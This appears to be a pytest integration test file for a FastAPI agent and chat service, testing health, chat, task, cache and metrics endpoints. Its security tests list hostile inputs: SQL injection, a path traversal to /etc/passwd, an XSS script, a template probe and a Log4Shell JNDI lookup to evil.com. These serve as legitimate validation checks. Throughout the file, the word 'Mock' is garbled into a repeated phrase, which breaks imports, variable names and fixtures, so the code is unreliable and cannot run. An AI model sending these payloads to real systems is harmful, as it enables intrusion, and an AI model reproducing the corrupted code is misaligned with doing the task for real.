"""
Integration tests for API endpoints
Testing real API integrations with Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Tested external dependencies
"""

import pytest
import asyncio
import json
import time
from unittest.Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test import patch, AsyncRemove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test, MagicRemove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test
from httpx import AsyncClient
from fastapi import status


class TestHealthAPIIntegration:
    """Integration tests for health API endpoints"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_health_endpoint_integration(self, async_client):
        """Test health endpoint integration with all services"""
        response = await async_client.get("/health")
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify comprehensive health response
        assert data["status"] == "healthy"
        assert "timestamp" in data
        assert "services" in data
        assert "performance" in data
        
        # Verify service status structure
        services = data["services"]
        expected_services = ["redis", "database", "http_ollama", "http_agents", "http_external"]
        for service in expected_services:
            assert service in services

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_detailed_health_integration(self, async_client):
        """Test detailed health endpoint integration"""
        response = await async_client.get("/api/v1/health/detailed")
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify detailed health structure
        required_fields = [
            "overall_status", "timestamp", "services", 
            "performance_metrics", "system_resources", "alerts", "recommendations"
        ]
        for field in required_fields:
            assert field in data

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_circuit_breaker_integration(self, async_client):
        """Test circuit breaker endpoint integration"""
        # Test status endpoint
        response = await async_client.get("/api/v1/health/circuit-breakers")
        assert response.status_code == 200
        data = response.json()
        
        assert "circuit_breakers" in data
        assert "total_breakers" in data
        assert "healthy_breakers" in data
        assert "open_breakers" in data
        
        # Test reset endpoint
        reset_response = await async_client.post("/api/v1/health/circuit-breakers/reset")
        assert reset_response.status_code == 200
        reset_data = reset_response.json()
        assert reset_data["status"] == "success"

    @pytest.mark.integration
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_health_endpoint_performance_under_load(self, async_client):
        """Test health endpoint performance under concurrent load"""
        # Create multiple concurrent requests
        tasks = []
        for _ in range(20):
            task = async_client.get("/health")
            tasks.append(task)
        
        start_time = time.time()
        responses = await asyncio.gather(*tasks)
        end_time = time.time()
        
        total_time = end_time - start_time
        
        # All requests should succeed
        for response in responses:
            assert response.status_code == 200
        
        # Performance should be reasonable under load
        assert total_time < 2.0, f"Health checks too slow under load: {total_time}s"


class TestAgentAPIIntegration:
    """Integration tests for agent management APIs"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_list_agents_integration(self, async_client):
        """Test agent listing with health checks"""
        response = await async_client.get("/api/v1/agents")
        
        assert response.status_code == 200
        agents = response.json()
        
        assert isinstance(agents, list)
        assert len(agents) > 0
        
        # Verify each agent has complete information
        for agent in agents:
            assert "id" in agent
            assert "name" in agent
            assert "status" in agent
            assert "capabilities" in agent
            assert agent["status"] in ["healthy", "unhealthy", "offline"]

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_get_specific_agent_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test getting specific agent with real health check"""
        # Test known agent
        agent_id = "jarvis-automation"
        response = await async_client.get(f"/api/v1/agents/{agent_id}")
        
        assert response.status_code == 200
        agent = response.json()
        
        assert agent["id"] == agent_id
        assert "name" in agent
        assert "status" in agent
        assert "capabilities" in agent
        assert isinstance(agent["capabilities"], list)

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_agent_health_caching_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test agent health check caching behavior"""
        agent_id = "jarvis-automation"
        
        # Make multiple requests to test caching
        response1 = await async_client.get(f"/api/v1/agents/{agent_id}")
        response2 = await async_client.get(f"/api/v1/agents/{agent_id}")
        
        assert response1.status_code == 200
        assert response2.status_code == 200
        
        # Responses should be consistent (cached)
        agent1 = response1.json()
        agent2 = response2.json()
        assert agent1["status"] == agent2["status"]

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_agent_input_validation_integration(self, async_client):
        """Test agent endpoint input validation integration"""
        malicious_inputs = [
            "'; DROP TABLE agents; --",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/}"
        ]
        
        for malicious_input in malicious_inputs:
            with patch('app.utils.validation.validate_agent_id') as Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validate:
                Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validate.side_effect = ValueError("Invalid agent ID")
                
                response = await async_client.get(f"/api/v1/agents/{malicious_input}")
                assert response.status_code == 400
                data = response.json()
                assert "Invalid agent ID" in data["detail"]


class TestChatAPIIntegration:
    """Integration tests for chat and AI APIs"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_chat_endpoint_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test chat endpoint with Ollama integration"""
        chat_request = {
            "message": "Hello, how are you?",
            "model": "tinyllama",
            "use_cache": True
        }
        
        response = await async_client.post("/api/v1/chat", json=chat_request)
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify chat response structure
        assert "response" in data
        assert "model" in data
        assert "cached" in data
        assert data["model"] == "tinyllama"
        assert isinstance(data["response"], str)
        assert isinstance(data["cached"], bool)

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_chat_streaming_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test streaming chat endpoint integration"""
        chat_request = {
            "message": "Tell me a story",
            "model": "tinyllama",
            "use_cache": False
        }
        
        response = await async_client.post("/api/v1/chat/stream", json=chat_request)
        
        assert response.status_code == 200
        assert "text/event-stream" in response.headers["content-type"]

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_batch_processing_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test batch processing integration"""
        prompts = [
            "Hello",
            "How are you?",
            "What's the weather like?"
        ]
        
        response = await async_client.post("/api/v1/batch", json=prompts)
        
        assert response.status_code == 200
        data = response.json()
        
        assert "results" in data
        assert isinstance(data["results"], list)
        assert len(data["results"]) == len(prompts)

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_chat_input_validation_integration(self, async_client):
        """Test chat endpoint input validation"""
        # Test malicious model name
        malicious_request = {
            "message": "Hello",
            "model": "'; DROP TABLE models; --",
            "use_cache": True
        }
        
        with patch('app.utils.validation.validate_model_name') as Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validate:
            Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validate.side_effect = ValueError("Invalid model name")
            
            response = await async_client.post("/api/v1/chat", json=malicious_request)
            assert response.status_code == 400

    @pytest.mark.integration
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_chat_performance_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test chat endpoint performance characteristics"""
        chat_request = {
            "message": "Quick test",
            "model": "tinyllama",
            "use_cache": True
        }
        
        start_time = time.time()
        response = await async_client.post("/api/v1/chat", json=chat_request)
        end_time = time.time()
        
        response_time = end_time - start_time
        
        assert response.status_code == 200
        assert response_time < 5.0, f"Chat response too slow: {response_time}s"


class TestTaskAPIIntegration:
    """Integration tests for task management APIs"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_task_creation_integration(self, async_client):
        """Test task creation and queuing integration"""
        task_request = {
            "task_type": "automation",
            "payload": {"action": "test_action", "data": "test_data"},
            "priority": 1
        }
        
        response = await async_client.post("/api/v1/tasks", json=task_request)
        
        assert response.status_code == 200
        data = response.json()
        
        assert "task_id" in data
        assert data["status"] == "queued"
        assert "result" in data
        
        task_id = data["task_id"]
        assert isinstance(task_id, str)
        assert len(task_id) > 0

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_task_status_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test task status retrieval integration"""
        task_id = "test-task-id"
        
        response = await async_client.get(f"/api/v1/tasks/{task_id}")
        
        assert response.status_code == 200
        data = response.json()
        
        assert "task_id" in data
        assert "status" in data
        assert "result" in data
        assert data["status"] in ["queued", "processing", "completed", "failed"]

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_task_workflow_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test complete task workflow from creation to completion"""
        # Create task
        task_request = {
            "task_type": "automation",
            "payload": {"test": "data"},
            "priority": 1
        }
        
        create_response = await async_client.post("/api/v1/tasks", json=task_request)
        assert create_response.status_code == 200
        create_data = create_response.json()
        task_id = create_data["task_id"]
        
        # Check task status
        status_response = await async_client.get(f"/api/v1/tasks/{task_id}")
        assert status_response.status_code == 200
        status_data = status_response.json()
        
        assert status_data["task_id"] == task_id
        assert "status" in status_data


class TestCacheAPIIntegration:
    """Integration tests for cache management APIs"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_cache_stats_integration(self, async_client):
        """Test cache statistics integration"""
        response = await async_client.get("/api/v1/cache/stats")
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify cache stats structure
        assert "hits" in data
        assert "misses" in data
        assert "hit_rate" in data
        assert "total_operations" in data

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_cache_clear_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test cache clearing integration"""
        # Clear all cache
        response = await async_client.post("/api/v1/cache/clear")
        
        assert response.status_code == 200
        data = response.json()
        assert "message" in data
        assert "All cache entries cleared" in data["message"]

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_cache_pattern_clear_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test cache pattern clearing integration"""
        pattern = "test:*"
        response = await async_client.post(f"/api/v1/cache/clear?pattern={pattern}")
        
        assert response.status_code == 200
        data = response.json()
        assert "message" in data
        assert "cache entries matching pattern" in data["message"]

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_cache_invalidation_integration(self, async_client):
        """Test cache invalidation by tags integration"""
        tags = ["user", "profile", "test"]
        
        response = await async_client.post("/api/v1/cache/invalidate", json=tags)
        
        assert response.status_code == 200
        data = response.json()
        
        assert "message" in data
        assert "tags" in data
        assert data["tags"] == tags

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_cache_warming_integration(self, async_client):
        """Test cache warming integration"""
        response = await async_client.post("/api/v1/cache/warm")
        
        assert response.status_code == 200
        data = response.json()
        
        assert "message" in data
        assert "timestamp" in data
        assert "warmed_categories" in data
        assert isinstance(data["warmed_categories"], list)


class TestMetricsAPIIntegration:
    """Integration tests for metrics and monitoring APIs"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_metrics_endpoint_integration(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_psutil):
        """Test comprehensive metrics endpoint integration"""
        response = await async_client.get("/api/v1/metrics")
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify metrics structure
        assert "system" in data
        assert "performance" in data
        
        # Verify system metrics
        system = data["system"]
        assert "cpu_percent" in system
        assert "memory" in system
        assert "disk_usage" in system
        assert "network" in system

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_prometheus_metrics_integration(self, async_client):
        """Test Prometheus metrics endpoint integration"""
        response = await async_client.get("/metrics")
        
        assert response.status_code == 200
        # Response should be plain text Prometheus format
        content_type = response.headers.get("content-type", "")
        assert "text/plain" in content_type

    @pytest.mark.integration
    @pytest.mark.api
    def test_settings_endpoint_integration(self, sync_client):
        """Test settings endpoint integration"""
        response = sync_client.get("/api/v1/settings")
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify settings structure
        assert "environment" in data
        assert "debug" in data
        assert "features" in data
        assert "performance" in data
        
        # Verify features
        features = data["features"]
        assert isinstance(features, dict)
        assert "ollama_enabled" in features
        assert "vector_db_enabled" in features


class TestErrorHandlingIntegration:
    """Integration tests for error handling across APIs"""

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_404_error_integration(self, async_client):
        """Test 404 error handling integration"""
        response = await async_client.get("/nonexistent-endpoint")
        
        assert response.status_code == 404

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_422_validation_error_integration(self, async_client):
        """Test validation error handling integration"""
        # Send invalid JSON to chat endpoint
        response = await async_client.post(
            "/api/v1/chat",
            content="invalid json",
            headers={"content-type": "application/json"}
        )
        
        assert response.status_code == 422

    @pytest.mark.integration
    @pytest.mark.api
    @pytest.mark.asyncio
    async def test_400_bad_request_integration(self, async_client):
        """Test bad request error handling integration"""
        # Test with invalid task type
        invalid_task = {
            "task_type": "",  # Invalid empty task type
            "payload": {},
            "priority": -1  # Invalid priority
        }
        
        response = await async_client.post("/api/v1/tasks", json=invalid_task)
        # This might return 200 if validation is not strict, but let's test the flow
        assert response.status_code in [200, 400, 422]

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_security_error_handling_integration(self, async_client):
        """Test security-related error handling integration"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd"
        ]
        
        for malicious_input in malicious_inputs:
            with patch('app.utils.validation.validate_agent_id') as Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validate:
                Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validate.side_effect = ValueError("Malicious input detected")
                
                response = await async_client.get(f"/api/v1/agents/{malicious_input}")
                assert response.status_code == 400


class TestConcurrencyIntegration:
    """Integration tests for concurrent API operations"""

    @pytest.mark.integration
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_health_checks(self, async_client):
        """Test concurrent health check requests"""
        # Create multiple concurrent health check requests
        tasks = []
        for _ in range(15):
            task = async_client.get("/health")
            tasks.append(task)
        
        responses = await asyncio.gather(*tasks)
        
        # All requests should succeed
        for response in responses:
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "healthy"

    @pytest.mark.integration
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_api_operations(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test concurrent mixed API operations"""
        # Create different types of concurrent requests
        health_task = async_client.get("/health")
        agents_task = async_client.get("/api/v1/agents")
        metrics_task = async_client.get("/api/v1/metrics")
        cache_stats_task = async_client.get("/api/v1/cache/stats")
        
        responses = await asyncio.gather(
            health_task, agents_task, metrics_task, cache_stats_task
        )
        
        # All requests should succeed
        for response in responses:
            assert response.status_code == 200

    @pytest.mark.integration
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_chat_requests(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test concurrent chat requests"""
        chat_request = {
            "message": "Hello",
            "model": "tinyllama",
            "use_cache": True
        }
        
        # Create multiple concurrent chat requests
        tasks = []
        for i in range(5):
            task = async_client.post("/api/v1/chat", json=chat_request)
            tasks.append(task)
        
        responses = await asyncio.gather(*tasks)
        
        # All requests should succeed
        for response in responses:
            assert response.status_code == 200
            data = response.json()
            assert "response" in data


class TestEndToEndWorkflows:
    """End-to-end integration tests for complete workflows"""

    @pytest.mark.integration
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_complete_ai_workflow(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test complete AI workflow from request to response"""
        # 1. Check system health
        health_response = await async_client.get("/health")
        assert health_response.status_code == 200
        
        # 2. List available agents
        agents_response = await async_client.get("/api/v1/agents")
        assert agents_response.status_code == 200
        
        # 3. Make chat request
        chat_request = {
            "message": "What can you help me with?",
            "model": "tinyllama",
            "use_cache": False
        }
        chat_response = await async_client.post("/api/v1/chat", json=chat_request)
        assert chat_response.status_code == 200
        
        # 4. Check metrics after operation
        metrics_response = await async_client.get("/api/v1/metrics")
        assert metrics_response.status_code == 200

    @pytest.mark.integration
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_task_management_workflow(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test complete task management workflow"""
        # 1. Create a task
        task_request = {
            "task_type": "automation",
            "payload": {"action": "test_workflow"},
            "priority": 1
        }
        create_response = await async_client.post("/api/v1/tasks", json=task_request)
        assert create_response.status_code == 200
        task_id = create_response.json()["task_id"]
        
        # 2. Check task status
        status_response = await async_client.get(f"/api/v1/tasks/{task_id}")
        assert status_response.status_code == 200
        
        # 3. Check system metrics
        metrics_response = await async_client.get("/api/v1/metrics")
        assert metrics_response.status_code == 200

    @pytest.mark.integration
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_cache_management_workflow(self, async_client, Remove Remove Remove Mocks - Only use Real Tests - Only use Real Tests - Only use Real Test_validation):
        """Test complete cache management workflow"""
        # 1. Check initial cache stats
        initial_stats = await async_client.get("/api/v1/cache/stats")
        assert initial_stats.status_code == 200
        
        # 2. Warm cache
        warm_response = await async_client.post("/api/v1/cache/warm")
        assert warm_response.status_code == 200
        
        # 3. Check updated cache stats
        updated_stats = await async_client.get("/api/v1/cache/stats")
        assert updated_stats.status_code == 200
        
        # 4. Clear cache
        clear_response = await async_client.post("/api/v1/cache/clear")
        assert clear_response.status_code == 200


if __name__ == "__main__":
    pytest.main([__file__, "-v"])